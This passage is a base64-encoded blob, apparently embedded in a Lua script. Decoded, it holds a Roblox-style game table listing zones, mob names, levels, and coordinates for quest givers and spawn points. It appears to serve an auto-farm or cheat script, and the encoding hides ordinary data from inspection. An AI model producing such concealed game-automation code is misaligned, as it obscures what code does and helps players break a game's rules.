i42Mil9LCB7TGV2ZWwgPSAxNzUsIE1vYiA9ICJEYXJrIE1hc3RlciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTQ4MzkuNTUsIDcxOC4wMSwgLTI2MjIuMTEpLCBTcGF3biA9IFZlY3RvcjMubmV3KC01MjUxLjgwLCAzODguOTksIC0yMjYwLjAzKX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJQcmlzb24iLCBFbW9qaSA9ICLim5PvuI8iLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDEwNSwgMTA1LCAxMDUpLCBNb2JzID0geyB7TGV2ZWwgPSAxOTAsIE1vYiA9ICJQcmlzb25lciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoNTMwOC40OCwgMi4wMCwgNDc1LjExKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg1MTcyLjg2LCAzLjExLCA0MTEuMTQpfSwge0xldmVsID0gMjEwLCBNb2IgPSAiRGFuZ2Vyb3VzIFByaXNvbmVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg1MzA4LjQ4LCAyLjAwLCA0NzUuMTEpLCBTcGF3biA9IFZlY3RvcjMubmV3KDU1OTguODYsIDEuOTksIDU3Ny4yMCl9LCB7TGV2ZWwgPSAyMjAsIE1vYiA9ICJXYXJkZW4iLCBHaXZlciA9IFZlY3RvcjMubmV3KDUxODguOTEsIDMuODgsIDY4OC4yMiksIFNwYXduID0gVmVjdG9yMy5uZXcoNTE4MC4wOCwgMy44OCwgODg3LjM1KX0sIHtMZXZlbCA9IDIzMCwgTW9iID0gIkNoaWVmIFdhcmRlbiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoNTE4OC45MSwgMy44OCwgNjg4LjIyKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg1MTgwLjA4LCAzLjg4LCA4ODcuMzUpfSwge0xldmVsID0gMjQwLCBNb2IgPSAiU3dhbiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoNTE4OC45MSwgMy44OCwgNjg4LjIyKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg1MzIwLjQ5LCA4LjEzLCA2NjguMzEpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIkNvbG9zc2V1bSIsIEVtb2ppID0gIvCfj5/vuI8iLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDIxOCwgMTY1LCAzMiksIE1vYnMgPSB7IHtMZXZlbCA9IDIyNSwgTW9iID0gIlRvZ2EgV2FycmlvciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTE1NzguMDQsIDcuNzMsIC0yOTg1Ljc2KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTkyMC40NSwgNy42MywgLTI3NzUuNDApfSwge0xldmVsID0gMjc1LCBNb2IgPSAiR2xhZGlhdG9yIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTU3OC4wNCwgNy43MywgLTI5ODUuNzYpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0xMjk2LjkxLCA3Ljc4LCAtMzI4OC43NCl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiTWFnbWEgVmlsbGFnZSIsIEVtb2ppID0gIvCfjIsiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDE3OCwgMzQsIDM0KSwgTW9icyA9IHsge0xldmVsID0gMzAwLCBNb2IgPSAiTWlsaXRhcnkgU29sZGllciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTUzMTUuMzMsIDEyLjU4LCA4NTE1Ljg0KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtNTQwNy4yNSwgMTEuNDAsIDg0NTkuMDUpfSwge0xldmVsID0gMzI1LCBNb2IgPSAiTWlsaXRhcnkgU3B5IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNTMxNS4zMywgMTIuNTgsIDg1MTUuODQpLCBTcGF3biA9IFZlY3RvcjMubmV3KC01ODEzLjU0LCA3Ny41NywgODczNS43OSl9LCB7TGV2ZWwgPSAzNTAsIE1vYiA9ICJNYWdtYSBBZG1pcmFsIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNTMxNS4zMywgMTIuNTgsIDg1MTUuODQpLCBTcGF3biA9IFZlY3RvcjMubmV3KC01NTcxLjk5LCAxOC4yOSwgODY5Mi4xNCl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiVW5kZXJ3YXRlciBDaXR5IiwgRW1vamkgPSAi8J+QnyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMTkxLCAyNTUpLCBNb2JzID0geyB7TGV2ZWwgPSAzNzUsIE1vYiA9ICJGaXNobWFuIFdhcnJpb3IiLCBHaXZlciA9IFZlY3RvcjMubmV3KDYxMTIxLjcyLCAxOC44MSwgMTU2Ny4zNyksIFNwYXduID0gVmVjdG9yMy5uZXcoNjA5NTEuNTQsIDE4LjgyLCAxNDkxLjc2KX0sIHtMZXZlbCA9IDQwMCwgTW9iID0gIkZpc2htYW4gQ29tbWFuZG8iLCBHaXZlciA9IFZlY3RvcjMubmV3KDYxMTIxLjcyLCAxOC44MSwgMTU2Ny4zNyksIFNwYXduID0gVmVjdG9yMy5uZXcoNjE4ODUuMDUsIDE4LjgyLCAxNDgwLjI1KX0sIHtMZXZlbCA9IDQyNSwgTW9iID0gIkZpc2htYW4gTG9yZCIsIEdpdmVyID0gVmVjdG9yMy5uZXcoNjExMjEuNzIsIDE4LjgxLCAxNTY3LjM3KSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg2MTM0OC44NiwgMzEuMzQsIDExNzAuNjUpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIlVwcGVyIFNreWxhbmRzIiwgRW1vamkgPSAi4puFIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDIxNSwgMCksIE1vYnMgPSB7IHtMZXZlbCA9IDQ1MCwgTW9iID0gIkdvZCdzIEd1YXJkIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNDcyMi4xNiwgODQ1LjYyLCAtMTk1Mi4xNyksIFNwYXduID0gVmVjdG9yMy5uZXcoLTQ3MjIuMTYsIDg0NS42MiwgLTE5NTIuMTcpfSwge0xldmVsID0gNDc1LCBNb2IgPSAiU2hhbmRhIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNzg2MS40NSwgNTU0NS44MywgLTM4Mi4zMiksIFNwYXduID0gVmVjdG9yMy5uZXcoLTc2NTEuNjIsIDU1NDUuODMsIC01MTUuOTkpfSwge0xldmVsID0gNTAwLCBNb2IgPSAiV3lzcGVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNzg2MS40NSwgNTU0NS44MywgLTM4Mi4zMiksIFNwYXduID0gVmVjdG9yMy5uZXcoLTc4ODcuNDYsIDU1NDUuODMsIC02ODYuMTApfSwge0xldmVsID0gNTI1LCBNb2IgPSAiUm95YWwgU3F1YWQiLCBHaXZlciA9IFZlY3RvcjMubmV3KC03OTAzLjE3LCA1NjM2LjMwLCAtMTQwOC4yMyksIFNwYXduID0gVmVjdG9yMy5uZXcoLTc2MTYuOTksIDU2MDcuMjIsIC0xNDc2LjAyKX0sIHtMZXZlbCA9IDU1MCwgTW9iID0gIlJveWFsIFNvbGRpZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC03OTAzLjE3LCA1NjM2LjMwLCAtMTQwOC4yMyksIFNwYXduID0gVmVjdG9yMy5uZXcoLTc4MzYuNDEsIDU2MDcuMjIsIC0xNzM5LjM0KX0sIHtMZXZlbCA9IDU3NSwgTW9iID0gIlRodW5kZXIgR29kIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNzkwMy4xNywgNTYzNi4zMCwgLTE0MDguMjMpLCBTcGF3biA9IFZlY3RvcjMubmV3KC03Nzc5LjAzLCA1NjA3LjE1LCAtMjMxMi43MSl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiRm91bnRhaW4gQ2l0eSIsIEVtb2ppID0gIuKbsiIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAyNTUpLCBNb2JzID0geyB7TGV2ZWwgPSA2MjUsIE1vYiA9ICJHYWxsZXkgUGlyYXRlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg1MjYyLjQxLCAzOC44NCwgNDA0OC43NCksIFNwYXduID0gVmVjdG9yMy5uZXcoNTUzOS4wOCwgMzguODgsIDM5ODIuNjQpfSwge0xldmVsID0gNjUwLCBNb2IgPSAiR2FsbGV5IENhcHRhaW4iLCBHaXZlciA9IFZlY3RvcjMubmV3KDUyNjIuNDEsIDM4Ljg0LCA0MDQ4Ljc0KSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg1NDYzLjczLCAzOC44NCwgNDg5OS40OSl9LCB7TGV2ZWwgPSA2NzUsIE1vYiA9ICJDeWJvcmciLCBHaXZlciA9IFZlY3RvcjMubmV3KDUyNjIuNDEsIDM4Ljg0LCA0MDQ4Ljc0KSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg2MTE3LjY0LCA3LjI1LCAzOTU4LjU3KX0gfSB9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgWyJTRUEgMiJdID0gewogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJLaW5nZG9tIG9mIFJvc2UiLCBFbW9qaSA9ICLwn4y5IiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDIwLCAxNDcpLCBNb2JzID0geyB7TGV2ZWwgPSA3MDAsIE1vYiA9ICJSYWlkZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC00MjcuMjIsIDczLjMxLCAxODM3LjA1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtNzExLjU2LCAzOS40OCwgMjM3OS40MSl9LCB7TGV2ZWwgPSA3MjUsIE1vYiA9ICJNZXJjZW5hcnkiLCBHaXZlciA9IFZlY3RvcjMubmV3KC00MjcuMjIsIDczLjMxLCAxODM3LjA1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTA0MC4wMSwgNzMuMzAsIDE0MzYuMTEpfSwge0xldmVsID0gNzUwLCBNb2IgPSAiRGlhbW9uZCIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTQyNy4yMiwgNzMuMzEsIDE4MzcuMDUpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0xNTU3LjQ3LCAxOTguOTMsIC0xNjIuMTMpfSwge0xldmVsID0gNzc1LCBNb2IgPSAiU3dhbiBQaXJhdGUiLCBHaXZlciA9IFZlY3RvcjMubmV3KDYzNS4wNywgNzMuNDEsIDkxNy4wNiksIFNwYXduID0gVmVjdG9yMy5uZXcoOTE0LjM3LCA3My4zMCwgMTI1Ni4zMyl9LCB7TGV2ZWwgPSA4MDAsIE1vYiA9ICJGYWN0b3J5IFN0YWZmIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg2MzUuMDcsIDczLjQxLCA5MTcuMDYpLCBTcGF3biA9IFZlY3RvcjMubmV3KDEzMC4yNSwgNzMuMzAsIC0yNjQuMDIpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIkdyZWVuIFpvbmUiLCBFbW9qaSA9ICLwn42DIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigzNCwgMTM5LCAzNCksIE1vYnMgPSB7IHtMZXZlbCA9IDg3NSwgTW9iID0gIk1hcmluZSBMaWV1dGVuYW50IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMjQ0MS4zMywgNzMuMzYsIC0zMjE4LjEzKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMjkzMC4zNywgNzMuMzEsIC0yOTc1LjQwKX0sIHtMZXZlbCA9IDkwMCwgTW9iID0gIk1hcmluZSBDYXB0YWluIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMjQ0MS4zMywgNzMuMzYsIC0zMjE4LjEzKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTkxNS40NSwgNzMuMzEsIC0zMjU4LjI4KX0sIHtMZXZlbCA9IDkyNSwgTW9iID0gIk9yYml0dXMiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0yNDQxLjMzLCA3My4zNiwgLTMyMTguMTMpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0yMTMzLjI0LCA3My4zMSwgLTQxNjAuMDYpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIkdyYXZleWFyZCIsIEVtb2ppID0gIvCfqqYiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDc1LCAwLCAxMzApLCBNb2JzID0geyB7TGV2ZWwgPSA5NTAsIE1vYiA9ICJab21iaWUiLCBHaXZlciA9IFZlY3RvcjMubmV3KC01NDk1LjE4LCA0OC44MiwgLTc5My45OSksIFNwYXduID0gVmVjdG9yMy5uZXcoLTU2NjAuNDUsIDQ4LjgyLCAtNjM0LjE2KX0sIHtMZXZlbCA9IDk3NSwgTW9iID0gIlZhbXBpcmUiLCBHaXZlciA9IFZlY3RvcjMubmV3KC01NDk1LjE4LCA0OC44MiwgLTc5My45OSksIFNwYXduID0gVmVjdG9yMy5uZXcoLTYwMTAuNzgsIDYuNzQsIC0xMzEzLjIxKX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJTbm93IE1vdW50YWluIiwgRW1vamkgPSAi8J+PlO+4jyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyNTUsIDI1NSksIE1vYnMgPSB7IHtMZXZlbCA9IDEwMDAsIE1vYiA9ICJTbm93IFRyb29wZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KDYwNy40NywgNDAxLjc2LCAtNTM3MC43OSksIFNwYXduID0gVmVjdG9yMy5uZXcoNDg3LjczLCA0MDEuNzYsIC01Mzk0Ljg5KX0sIHtMZXZlbCA9IDEwNTAsIE1vYiA9ICJXaW50ZXIgV2FycmlvciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoNjA3LjQ3LCA0MDEuNzYsIC01MzcwLjc5KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxMTY1LjkyLCA0MjkuNzYsIC01MTkwLjAyKX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJIb3QgYW5kIENvbGQiLCBFbW9qaSA9ICLwn4yh77iPIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDY5LCAwKSwgTW9icyA9IHsge0xldmVsID0gMTEwMCwgTW9iID0gIkxhYiBTdWJvcmRpbmF0ZSIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTYyMjcuNzAsIDgyLjE2LCAtNDg1MS41MiksIFNwYXduID0gVmVjdG9yMy5uZXcoLTU4MjguMjcsIDgyLjE2LCAtNDQ1MC40Nyl9LCB7TGV2ZWwgPSAxMTI1LCBNb2IgPSAiSG9ybmVkIFdhcnJpb3IiLCBHaXZlciA9IFZlY3RvcjMubmV3KC02MjI3LjcwLCA4Mi4xNiwgLTQ4NTEuNTIpLCBTcGF3biA9IFZlY3RvcjMubmV3KC02Mjg0LjYzLCAyOS41MiwgLTU4NTMuNTMpfSwge0xldmVsID0gMTE1MCwgTW9iID0gIlNtb2tlIEFkbWlyYWwiLCBHaXZlciA9IFZlY3RvcjMubmV3KC02MjI3LjcwLCA4Mi4xNiwgLTQ4NTEuNTIpLCBTcGF3biA9IFZlY3RvcjMubmV3KC00ODk3LjM5LCAyMzQuMzUsIC01NTAwLjE4KX0sIHtMZXZlbCA9IDExNzUsIE1vYiA9ICJNYWdtYSBOaW5qYSIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTU0MDMuNjEsIDI5LjUxLCAtNTM2OS44OCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTU3NjAuNDMsIDI5LjUxLCAtNTUyOS42NCl9LCB7TGV2ZWwgPSAxMjAwLCBNb2IgPSAiTGF2YSBQaXJhdGUiLCBHaXZlciA9IFZlY3RvcjMubmV3KC01NDAzLjYxLCAyOS41MSwgLTUzNjkuODgpLCBTcGF3biA9IFZlY3RvcjMubmV3KC01MTE4LjQ4LCAyOS41MSwgLTQ5NjkuMzIpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIkN1cnNlZCBTaGlwIiwgRW1vamkgPSAi8J+aoiIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoNDcsIDc5LCA3OSksIE1vYnMgPSB7IHtMZXZlbCA9IDEyNTAsIE1vYiA9ICJTaGlwIERlY2toYW5kIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygxMDM5LjI2LCAxMjUuNDAsIDMyOTA3Ljg1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxMjEyLjk4LCAxMjYuMDcsIDMyOTg5LjIyKX0sIHtMZXZlbCA9IDEyNzUsIE1vYiA9ICJTaGlwIEVuZ2luZWVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygxMDM5LjI2LCAxMjUuNDAsIDMyOTA3Ljg1KSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg4ODMuNzQsIDQ0LjQwLCAzMjk2NS43OSl9LCB7TGV2ZWwgPSAxMzAwLCBNb2IgPSAiU2hpcCBTdGV3YXJkIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg5NzUuNDQsIDEyNS40MCwgMzMyNTIuMDIpLCBTcGF3biA9IFZlY3RvcjMubmV3KDkyMC40MywgMTI5LjkwLCAzMzQ0NS4yNil9LCB7TGV2ZWwgPSAxMzI1LCBNb2IgPSAiU2hpcCBPZmZpY2VyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg5NzUuNDQsIDEyNS40MCwgMzMyNTIuMDIpLCBTcGF3biA9IFZlY3RvcjMubmV3KDkxOS4yMiwgMTgxLjc4LCAzMzMxMi4yOCl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiSWNlIENhc3RsZSIsIEVtb2ppID0gIvCfj7AiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDEzNSwgMjA2LCAyNTApLCBNb2JzID0geyB7TGV2ZWwgPSAxMzUwLCBNb2IgPSAiQXJjdGljIFdhcnJpb3IiLCBHaXZlciA9IFZlY3RvcjMubmV3KDU2NjguMjIsIDI4LjUyLCAtNjQ4Mi40MyksIFNwYXduID0gVmVjdG9yMy5uZXcoNjAyNy40MCwgMjguNzEsIC02MjM3Ljg4KX0sIHtMZXZlbCA9IDEzNzUsIE1vYiA9ICJTbm93IEx1cmtlciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoNTY2OC4yMiwgMjguNTIsIC02NDgyLjQzKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg1NTc0LjUyLCAyOC40NywgLTY3NzIuMDgpfSwge0xldmVsID0gMTQwMCwgTW9iID0gIkF3YWtlbmVkIEljZSBBZG1pcmFsIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg1NjY4LjIyLCAyOC41MiwgLTY0ODIuNDMpLCBTcGF3biA9IFZlY3RvcjMubmV3KDY0NTguOTgsIDI5Ni45MCwgLTY5MzEuMzMpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIkZvcmdvdHRlbiBJc2xhbmQiLCBFbW9qaSA9ICLwn5KAIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMTIsIDEyOCwgMTQ0KSwgTW9icyA9IHsge0xldmVsID0gMTQyNSwgTW9iID0gIlNlYSBTb2xkaWVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMzA1NC43MSwgMjM5Ljk5LCAtMTAxNDUuMTIpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0zMzgyLjA0LCAyNy4yOSwgLTk4MDAuNzUpfSwge0xldmVsID0gMTQ1MCwgTW9iID0gIldhdGVyIEZpZ2h0ZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0zMDU0LjcxLCAyMzkuOTksIC0xMDE0NS4xMiksIFNwYXduID0gVmVjdG9yMy5uZXcoLTM0NDkuMTcsIDIzOS4xOSwgLTEwNTMwLjIyKX0sIHtMZXZlbCA9IDE0NzUsIE1vYiA9ICJUaWRlIEtlZXBlciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTMwNTQuNzEsIDIzOS45OSwgLTEwMTQ1LjEyKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMzcxNS4yMywgNzcuNjUsIC0xMTQ1MS4zMil9IH0gfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIFsiU0VBIDMiXSA9IHsKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiUG9ydCBUb3duIiwgRW1vamkgPSAi8J+PmO+4jyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjA1LCAxMzMsIDYzKSwgTW9icyA9IHsge0xldmVsID0gMTUwMCwgTW9iID0gIlBpc3RvbCBNaWxsaW9uYWlyZSIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTQ0OS41MywgMTA4LjkxLCA1OTQ3Ljc3KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTIzLjA2LCA1Ny4zMiwgNTc1NC4yMil9LCB7TGV2ZWwgPSAxNTI1LCBNb2IgPSAiUGlzdG9sIEJpbGxpb25haXJlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNDQ5LjUzLCAxMDguOTEsIDU5NDcuNzcpLCBTcGF3biA9IFZlY3RvcjMubmV3KC05NC4yMywgODUuMDIsIDYxNDYuNTEpfSwge0xldmVsID0gMTU1MCwgTW9iID0gIlN0b25lIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNDQ5LjUzLCAxMDguOTEsIDU5NDcuNzcpLCBTcGF3biA9IFZlY3RvcjMubmV3KC05NzQuNzUsIDUyLjkzLCA2Nzk2LjI4KX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJIeWRyYSBJc2xhbmQiLCBFbW9qaSA9ICLwn5CNIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig1MCwgMjA1LCA1MCksIE1vYnMgPSB7IHtMZXZlbCA9IDE1NzUsIE1vYiA9ICJEcmFnb24gQ3JldyBXYXJyaW9yIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg2NzM4LjIwLCAxMjcuNzIsIC03MTAuODgpLCBTcGF3biA9IFZlY3RvcjMubmV3KDY4MTcuNTYsIDU2LjA2LCAtODc3LjUzKX0sIHtMZXZlbCA9IDE2MDAsIE1vYiA9ICJEcmFnb24gQ3JldyBBcmNoZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KDY3MzguMjAsIDEyNy43MiwgLTcxMC44OCksIFNwYXduID0gVmVjdG9yMy5uZXcoNjc4Ni43OCwgNDg0LjcxLCAzNTQuODkpfSwge0xldmVsID0gMTYyNSwgTW9iID0gIkh5ZHJhIEVuZm9yY2VyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg1MjEyLjg2LCAxMDA0LjQxLCA3NTcuODEpLCBTcGF3biA9IFZlY3RvcjMubmV3KDQ1NjEuMDYsIDEwMDIuNTcsIDQ2OS41MSl9LCB7TGV2ZWwgPSAxNjUwLCBNb2IgPSAiVmVub21vdXMgQXNzYWlsYW50IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg1MjEyLjg2LCAxMDA0LjQxLCA3NTcuODEpLCBTcGF3biA9IFZlY3RvcjMubmV3KDQ1NTIuNzgsIDExNTAuMjcsIDg1OC42Myl9LCB7TGV2ZWwgPSAxNjc1LCBNb2IgPSAiSHlkcmEgTGVhZGVyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldyg1MjEyLjg2LCAxMDA0LjQxLCA3NTcuODEpLCBTcGF3biA9IFZlY3RvcjMubmV3KDU3NTAuODQsIDEwMTMuNTMsIC0yOS42NCl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiR3JlYXQgVHJlZSIsIEVtb2ppID0gIvCfjLMiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDM0LCAxMzksIDM0KSwgTW9icyA9IHsge0xldmVsID0gMTcwMCwgTW9iID0gIk1hcmluZSBDb21tb2RvcmUiLCBHaXZlciA9IFZlY3RvcjMubmV3KDI0ODIuNTgsIDc0LjU4LCAtNjc4My4xMSksIFNwYXduID0gVmVjdG9yMy5uZXcoMjU5MS43NCwgNzQuNTgsIC03ODU2LjMxKX0sIHtMZXZlbCA9IDE3MjUsIE1vYiA9ICJNYXJpbmUgUmVhciBBZG1pcmFsIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygyNDgyLjU4LCA3NC41OCwgLTY3ODMuMTEpLCBTcGF3biA9IFZlY3RvcjMubmV3KDM2NzIuMzEsIDEyNC4yOCwgLTcxMjQuMjIpfSwge0xldmVsID0gMTc1MCwgTW9iID0gIktpbG8gQWRtaXJhbCIsIEdpdmVyID0gVmVjdG9yMy5uZXcoMjQ4Mi41OCwgNzQuNTgsIC02NzgzLjExKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygyODg5Ljg1LCA1MDkuNjMsIC03Mzc1LjIwKX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJGbG9hdGluZyBUdXJ0bGUiLCBFbW9qaSA9ICLwn5CiIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMDcsIDE0MiwgMzUpLCBNb2JzID0geyB7TGV2ZWwgPSAxNzc1LCBNb2IgPSAiRmlzaG1hbiBSYWlkZXIiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xMDU4NC40NiwgMzMyLjEwLCAtODc2MS4xNCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTEwMzgxLjQ4LCAzMzIuMTAsIC04MzcyLjQzKX0sIHtMZXZlbCA9IDE4MDAsIE1vYiA9ICJGaXNobWFuIENhcHRhaW4iLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xMDU4NC40NiwgMzMyLjEwLCAt" .. "ODc2MS4xNCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTEwOTc1LjI2LCAzMzIuMTAsIC04OTU1LjQ0KX0sIHtMZXZlbCA9IDE4MjUsIE1vYiA9ICJGb3Jlc3QgUGlyYXRlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTMyMzYuMDcsIDMzMi43MiwgLTc2MjUuNTQpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0xMzQwMS4xNiwgMzMyLjcyLCAtNzg0NC41Mil9LCB7TGV2ZWwgPSAxODUwLCBNb2IgPSAiTXl0aG9sb2dpY2FsIFBpcmF0ZSIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTEzMjM2LjA3LCAzMzIuNzIsIC03NjI1LjU0KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTM1MTIuMjMsIDQ2OS45MiwgLTY4MzEuNTcpfSwge0xldmVsID0gMTg3NSwgTW9iID0gIkNhcHRhaW4gRWxlcGhhbnQiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xMzIzNi4wNywgMzMyLjcyLCAtNzYyNS41NCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTEzMjUxLjgzLCAzMjUuNDIsIC04Mzg4LjM4KX0sIHtMZXZlbCA9IDE5MDAsIE1vYiA9ICJKdW5nbGUgUGlyYXRlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTI2ODEuNjIsIDM5MS4yMCwgLTk5MDAuODIpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0xMjAxNy42MCwgMzMyLjA4LCAtMTA1NzUuMzYpfSwge0xldmVsID0gMTkyNSwgTW9iID0gIk11c2tldGVlciBQaXJhdGUiLCBHaXZlciA9IFZlY3RvcjMubmV3KC0xMjY4MS42MiwgMzkxLjIwLCAtOTkwMC44MiksIFNwYXduID0gVmVjdG9yMy5uZXcoLTEzMzQ4LjUxLCAzOTEuODksIC05NzgyLjA5KX0sIHtMZXZlbCA9IDE5NTAsIE1vYiA9ICJCZWF1dGlmdWwgUGlyYXRlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTI2ODEuNjIsIDM5MS4yMCwgLTk5MDAuODIpLCBTcGF3biA9IFZlY3RvcjMubmV3KDUzNjMuNzYsIDIyLjYxLCAtMjk5LjI5KX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJIYXVudGVkIENhc3RsZSIsIEVtb2ppID0gIvCfkbsiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDcyLCA2MSwgMTM5KSwgTW9icyA9IHsge0xldmVsID0gMTk3NSwgTW9iID0gIlNrZWxldG9uIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtOTQ4MC4zNSwgMTQyLjQ0LCA1NTY0LjcxKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtODc1My43OSwgMTQyLjQ0LCA2MDIzLjM5KX0sIHtMZXZlbCA9IDIwMDAsIE1vYiA9ICJMaXZpbmcgWm9tYmllIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtOTQ4MC4zNSwgMTQyLjQ0LCA1NTY0LjcxKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtMTAxNDUuMzYsIDEzOC45NywgNTkzNy4yMyl9LCB7TGV2ZWwgPSAyMDI1LCBNb2IgPSAiRGVtb25pYyBTb3VsIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtOTUxMy40NiwgMTcyLjQ0LCA2MDc3LjM5KSwgU3Bhd24gPSBWZWN0